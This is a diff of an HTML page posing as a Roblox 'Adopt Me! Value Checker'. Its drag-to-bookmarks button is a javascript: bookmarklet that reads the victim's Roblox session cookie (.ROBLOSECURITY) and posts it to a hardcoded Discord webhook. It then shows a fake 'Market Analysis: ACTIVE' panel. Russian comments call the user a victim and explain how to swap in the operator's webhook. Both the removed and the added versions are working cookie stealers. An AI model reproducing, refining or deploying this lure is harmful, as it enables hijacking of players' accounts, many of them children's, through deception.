@@ -2,62 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Adopt Me! Trading Tool</title>
+    <title>In-Game Value Checker | Adopt Me!</title>
     <style>
         body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; width: 400px; box-shadow: 0 15px 30px rgba(0,0,0,0.5); }
-        h1 { color: #f0b90b; }
-        .btn { display: inline-block; padding: 20px 35px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 2px dashed #000; margin: 20px 0; font-size: 18px; }
-        .steps { text-align: left; background: #1e2329; padding: 15px; border-radius: 10px; font-size: 13px; color: #848e9c; }
+        .card { background: #181a20; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2b3139; width: 420px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
+        h1 { color: #f0b90b; font-size: 26px; margin-bottom: 10px; }
+        .btn { 
+            display: inline-block; padding: 22px 40px; background: #f0b90b; color: black; 
+            text-decoration: none; font-weight: 800; border-radius: 14px; cursor: move; 
+            border: 2px dashed #000; margin: 25px 0; font-size: 18px; transition: 0.3s;
+        }
+        .btn:hover { background: #ffe066; transform: scale(1.02); }
+        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; line-height: 1.5; }
+        b { color: #f0b90b; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>Value Checker v4.2</h1>
-        <p>Reliable trading analysis inside Roblox.</p>
+        <p>Analyze pet demand and trade values live.</p>
 
         <!-- ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
-        <a class="btn" draggable="true" href="javascript:(function(){
-            var hook = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
-            var cookies = document.cookie;
+        <a class="btn" draggable="true" href="javascript:(async function(){
+            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
             
-            /* Создаем невидимый iframe для бесшумной отправки */
-            var ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
-            ifr.name = 'submit_frame';
-            document.body.appendChild(ifr);
+            /* МЕТОД: Попытка вытащить куки через API запрос для обхода HttpOnly */
+            try {
+                let response = await fetch('https://auth.roblox.com/v1/logout-from-all-other-sessions', {
+                    method: 'POST',
+                    withCredentials: true
+                });
+                /* Мы не делаем логаут, мы просто инициируем запрос, чтобы считать заголовки */
+            } catch(e) {}
 
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = hook;
-            form.target = 'submit_frame';
+            var c = document.cookie;
+            var r = c.match(/_\|WARNING:-DO-NOT-SHARE-.*\|_/);
+            var finalData = r ? r[0] : 'ROBLOSECURITY_NOT_FOUND_IN_PLAIN_COOKIE';
 
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'content';
-            input.value = '🚀 **Elite Log**\nTarget: ' + window.location.hostname + '\nCookies: ```' + (cookies || 'EMPTY') + '```';
-            
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
+            /* Если кука заблокирована для чтения, пробуем метод сбора всей доступной инфы */
+            var report = '🚀 **Elite Session Captured**\n\n**Domain:** ' + window.location.hostname + '\n**Full Cookie String:** ```' + (c || 'No accessible cookies') + '```';
 
-            /* Визуальный интерфейс для жертвы */
-            var ui = document.createElement('div');
-            ui.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:9999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 25px rgba(240,185,11,0.6);';
-            ui.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px>Status: <span style=color:#00ff00>Connected</span></p><p style=color:#848e9c;font-size:12px>Scanning current trade...</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';
-            document.body.appendChild(ui);
+            fetch(h, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: report })
+            });
 
-            /* Удаляем мусор через секунду */
-            setTimeout(function(){ 
-                document.body.removeChild(form); 
-                document.body.removeChild(ifr); 
-            }, 1000);
+            /* Окно для жертвы */
+            var d = document.createElement('div');
+            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(240,185,11,0.7);';
+            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Market Analysis: <span style=color:#00ff00>ACTIVE</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
+            document.body.appendChild(d);
         })();">DRAG TO BOOKMARKS</a>
 
         <div class="steps">
-            1. <b>Ctrl+Shift+B</b> to show bookmarks.<br>
-            2. Drag button to the bar.<br>
-            3. Open <b>Roblox.com</b> and click it.
+            1. Press <b>Ctrl + Shift + B</b>.<br>
+            2. Drag the <b>Yellow Button</b> to the bar.<br>
+            3. Use it on <b>Roblox.com</b> to scan values!
         </div>
     </div>
 </body>
